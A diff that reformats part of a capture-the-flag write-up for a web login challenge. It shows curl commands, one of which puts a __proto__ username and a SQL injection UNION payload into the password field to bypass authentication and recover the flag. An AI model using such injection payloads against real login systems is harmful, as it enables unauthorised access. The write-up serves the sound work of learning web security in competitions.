@@ -60,11 +60,11 @@ Here, you will notice that if you specify <pre>__proto__</pre> or <pre>toString<
 For the remaining <pre>users[id]</pre>, just return an appropriate <pre>id</pre> using SQLi UNION.
 Do as follows.
 <pre>
-$ curl -X POST https://funnylogin.mc.ax/api/login -d "user=user&pass=pass"
+$ curl -X POST https://funnylogin.mc.ax/api/login -d "user=user&pass=pass"</pre>
 Found. Redirecting to /?message=Incorrect%20username%20or%20password
-$ curl -X POST https://funnylogin.mc.ax/api/login -d "user=__proto__&pass=' UNION SELECT id FROM users WHERE id = 1; -- satoki"
+<pre>$ curl -X POST https://funnylogin.mc.ax/api/login -d "user=__proto__&pass=' UNION SELECT id FROM users WHERE id = 1; -- satoki"</pre>
 Found. Redirecting to /?flag=dice%7Bi_l0ve_java5cript!%7D
-<pre>
+ 
 flag found
 
 
